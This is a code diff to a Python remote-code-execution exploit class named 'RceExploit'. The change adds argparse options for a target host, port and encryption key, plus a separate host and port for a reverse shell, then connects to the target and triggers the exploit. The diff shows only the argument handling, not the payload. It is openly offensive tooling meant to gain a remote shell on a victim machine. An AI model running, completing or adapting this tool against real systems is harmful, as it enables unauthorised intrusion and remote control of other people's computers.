@@ -2,6 +2,7 @@
 from Crypto.Util.Padding import pad
 from Crypto.Cipher import AES
 import keyboard
+import argparse
 import hashlib
 import socket
 import base64
@@ -25,13 +26,33 @@ class RceExploit:
 
     @staticmethod
     def main():
+        parser = argparse.ArgumentParser(add_help=False)
+        parser.add_argument("--h", "--host", dest="host", nargs="?", help="Target host") # Target host
+        parser.add_argument("--p", "--port", dest="port", nargs="?", help="Target port") # Target port
+        parser.add_argument("--k", "--key", dest="key", nargs="?", help="Encryption key") # Encryption key
+        parser.add_argument("--hs", "--host_shell", dest="host_shell", nargs="?", help="Host for Reverse Shell") # Host for Reverse Shell
+        parser.add_argument("--ps", "--port_shell", dest="port_shell", nargs="?", help="Port for Reverse Shell") # Port for Reverse Shell
+        parser.add_argument("--help", action="store_true", dest="help_flag", help="Show this help message and exit") # Help flag
 
-        host = input("Host > ") # Get target host
-        port = input("Port > ") # Get target port
-        key = input("Key > ") # Get encryption key
+        args, unknown = parser.parse_known_args() # Parse known args only
+ 
+        if args.help_flag:
+            parser.print_help() # Show help message
+            return # Exit after showing help
+
+
+        host = args.host if args.host else input("Host > ") # Get target host
+        port = args.port if args.port else input("Port > ") # Get target port
+        key = args.key if args.key else input("Key > ") # Get encryption key
+
+        port = int(port) if str(port).isdigit() else input("Port > ") # Ensure port is an integer
+
         sock = RceExploit.connection(host, port) # Connect to target
-        host_rs = input("Host for Reverse Shell > ") # Get rs host
-        port_rs = input("Port for Reverse Shell > ") # Get rs port
+        host_rs = args.host_shell if args.host_shell else input("Host for Reverse Shell > ") # Get rs host
+        port_rs = args.port_shell if args.port_shell else input("Port for Reverse Shell > ") # Get rs port
+        
+        port_rs = int(port_rs) if str(port_rs).isdigit() else input("Port for Reverse Shell > ") # Ensure rs port is an integer
+
         RceExploit.trigger(host_rs, port_rs, sock, key) # Trigger the Exploit
 
 
